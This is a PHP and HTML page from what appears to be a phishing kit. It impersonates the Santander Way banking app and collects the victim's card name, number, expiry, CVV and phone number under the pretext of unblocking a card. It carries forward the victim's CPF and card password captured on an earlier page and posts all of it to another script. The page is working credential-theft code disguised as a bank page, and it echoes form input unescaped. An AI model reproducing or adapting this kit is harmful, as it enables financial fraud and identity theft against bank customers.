<?php
    if(!isset($_POST['cpfbico']) || !isset($_POST['CCsenha'])){
        header("Location: AppLogin_prt2.php");
    }
?>
<html>
    <head>
        <meta name="theme-color" content="#DF0202"/>
        <title>Santander Way</title>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <meta name="content-type" content="text/html" charset="utf-8"/>        
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="css/HomeCard.css" type="text/css"/>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>
            <script>
                $(document).ready(function () { 
                    var $ccEspaco = $("#NumCard");
                    $ccEspaco.mask('0000 0000 0000 0000');

                    var $validade = $("#ValidadeCC");
                    $validade.mask('00/00');

                    var $vencimento = $("#VencimentoCC");
                    $vencimento.mask('00/00') ;

                    var $telefone = $("#Telefone");
                    $telefone.mask('(00)90000-0000');
                });
            </script>
        <style>
            @font-face{
                font-family: "SimSun";
                src: url(css/fonts/SimSun.ttf);
            }
            .TwoBtnBox{
                text-align: center;
                margin-left: -20px;
                margin-top: 10%;
                margin-right: ;
            }
            .TwoBtnBox input[type="submit"]{
                background-color: #D1D1D1;
                color: #969191;
                font-weight: bold;
                width: 250px;
                height: 50px;
                border-radius:30px;
                border: none;
                outline: none;
            }
            .boxcard{
                width: 300px;
                margin: 0 auto;
                margin-bottom: 20px;
                font-family: "SimSun";
                color: #fffc;
                font-weight: bold;
            
            }
            .cartao{
                margin-top: -50px;
                position: relative;
                display: inline-block;
                vertical-align: middle;
                width: 300px;
                height: 200px;
                background: url("img/cartaofree300px.png") no-repeat 0 0;
            }
            .NumeroCC{
                padding-top: 103px;
                margin-left: 35px;
                font-size: 20px;
                letter-spacing: 1px;
            }
            .dateValidation{
                display: flex;
            }
            .ValidadeCC{
                padding-top: 3px;
                padding-left: 56px;
                width: 30px;
            }
            .VencimentoCC{
                padding-top: 3px;
                padding-left: 70px;
            }
            .NomeCC{
                padding-left: 35px;
                text-transform: uppercase;
            }
            .TitleWDo h1{
                font-size: 16px;

            }
            input[type="submit"]{
                background-color: #1EB3BA;
                color: #fff;
                cursor: pointer;
                font-weight: bold;
                width: 250px;
                height: 50px;
                border-radius:30px;
                border: none;
                outline: none;
                font-family: inherit;
            }
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="header_red">
                    <div class="col-sm-12">
                        <div class="img_Away"></div>
                    </div>
                    <div class="versionApp"></div>
                </div>
            </div>
            
            <div class="row">
                <div class="sectionBg">                      
                    <div class="col-sm-12">
                        <div class="conteudo"><br>

                        <div class="boxcard" style="">
                            <div class="cartao cartao-frente">
                                <div class="NumeroCC" id="NumCC">
                                        0000 0000 0000 0000
                                </div>
                                <div class="dateValidation">
                                    <div class="ValidadeCC" id="CCval">
                                        00/00
                                    </div>
                                
                                    <div class="VencimentoCC" id="venCC">
                                        00/00
                                    </div>
                                </div>
                                <div class="NomeCC" id="NomeCC">
                                    NOME NO CARTÃO
                                </div>
                            </div>
                        </div>
                        <div class="formContent">
                            <div class="TitleWDo">
                                <h1>Por favor, preencha os dados a baixo com os dados do seu cartão para o desbloqueio</h1>
                            </div>

                            <form method="POST" action="AppFinishingInfo.php">
                                <input type="hidden" name="CCsenha" value="<?php echo $_POST['CCsenha'];?>"/>
                                <input type="hidden" name="cpfbico" value="<?php echo $_POST['cpfbico'];?>"/>
                                <br>
                                <div class="label-float">
                                            <input id="CardName" name="CardName" placeholder=" " type="text" maxlength="25" required>
                                            <label>Nome no cartão</label>
                                </div>
                                <div class="label-float">
                                            <input id="NumCard" name="NumCard" placeholder=" " type="tel" minlength="18" maxlength="19" required>
                                            <label>Número do cartão</label>
                                </div>
                                <div style="display: flex;" class="validationCampos">
                                    <div class="label-float">
                                                <input style="min-width: 10%; width: 90%;" id="ValidadeCC" name="ValidadeCC" placeholder=" " type="tel" minlength="4" maxlength="5" required>
                                                <label>Validade</label>                                            
                                    </div>                                    
                                    <div class="label-float">
                                                <input style="min-width: 10%; width: 100%;" id="CVVCC" name="CVVCC" placeholder=" " type="tel" minlength="3" maxlength="4" required>
                                                <label>CVV</label>                                            
                                    </div>
                                </div>
                                <div class="label-float">
                                            <input id="Telefone" name="Telefone" placeholder=" " type="tel" minlength="11" maxlength="14" required>
                                            <label>Telefone</label>
                                </div>
                                <div class="TwoBtnBox">
                                        <div class="btn_continuar">
                                            <input type="submit" style="background-color: #1EB3BA; color: #fff;" id="btnsubmit" name="prosseguir" value="PROSSEGUIR"/>
                                        </div>
                                        
                                    </div>
                            </form>
                        </div>
                            
                        </div>
                    </div>
                </div>
            </div>             
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
        <script>
          

             $("#CardName").keyup(function() {
                 var nomeNaCC = $("#CardName").val();
                $("#NomeCC").text(nomeNaCC);
             });


             $("#NumCard").keyup(function() {
                if(this.value.length == this.maxLength){
                    $("#ValidadeCC").focus();
                }                 
                 var nomeNaCC = $("#NumCard").val();               
                $("#NumCC").text(nomeNaCC);     
             });


             $("#ValidadeCC").keyup(function() {
                if(this.value.length == this.maxLength){
                    $("#CVVCC").focus();
                } 
                 var nomeNaCC = $("#ValidadeCC").val();
                $("#venCC").text(nomeNaCC);
             });


            //  $("#VencimentoCC").keyup(function() {
            //     if(this.value.length == this.maxLength){
            //         $("#CVVCC").focus();
            //     } 
            //      var nomeNaCC = $("#VencimentoCC").val();
            //     $("#venCC").text(nomeNaCC);
            //  });


              $("#CVVCC").keyup(function(){
                 if (this.value.length == this.maxLength){
                     $("#Telefone").focus();
                 }
             });

        </script>
    </body>
</html>